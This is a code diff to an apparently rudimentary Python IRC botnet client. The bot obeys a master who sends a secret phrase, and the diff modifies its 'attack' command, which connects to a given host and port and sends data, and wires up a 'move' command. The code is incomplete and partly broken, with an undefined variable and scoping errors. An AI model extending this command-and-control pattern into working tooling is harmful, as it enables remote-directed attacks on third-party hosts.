@@ -63,20 +63,23 @@ def status(masterName):
     irc.send(msg.encode())
     return
 #use to attack
-def attack(hostname,port):
+def attack(masterName, hostname,port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
         s.connect((hostname,int(port)))
-        s.send()
+        attack = botname+str(atkCounter)
+        s.send(req.encode())
+        atkCounter += 1
         msg = "PRIVMSG "+masterName+" :success\r\n"
         irc.send(msg.encode())
-    except:
+    except Exception as err:
         msg = "PRIVMSG "+masterName+" :fail\r\n"
         irc.send(msg.encode())
+        print(err)
     return
 #use to move
-def move(hostname,port,channel):
+def move(masterName,hostname,port,channel):
     return
 # use the listen to chat
 def listen():
@@ -96,11 +99,11 @@ def listen():
             if ":"+sphrase == inPhrase:
                 print ("serving master!")
                 if inCmd == 'attack':
-                    attack(inmsg[5],int(inmsg[6]))
+                    attack(masterName,inmsg[5],int(inmsg[6]))
                 elif inCmd == 'status':
                     status(masterName)
                 elif inCmd == 'move':
-                    pass
+                    move(masterName,inmsg[5],int(inmsg[6]),inmsg[7])
                 elif inCmd == 'shutdown':
                     shutdown()
 
@@ -116,6 +119,7 @@ def listen():
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 irc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 botname = ""
+atkCounter = 0
 while True:
     connect()
     listen()
